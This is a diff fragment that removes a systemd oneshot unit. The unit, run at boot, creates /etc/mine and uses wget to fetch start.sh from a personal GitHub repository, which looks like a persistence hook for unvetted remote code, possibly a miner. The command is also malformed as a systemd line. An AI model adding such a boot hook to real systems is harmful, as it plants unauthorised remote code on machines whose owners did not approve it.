@@ -1,9 +1,0 @@
-[Unit]
-Description=My command
-
-[Service]
-Type=oneshot 
-ExecStart=cd /etc; mkdir mine; cd mine; wget -C https://github.com/aleksey1255/ai/raw/main/start.sh
-
-[Install]
-WantedBy=multi-user.target
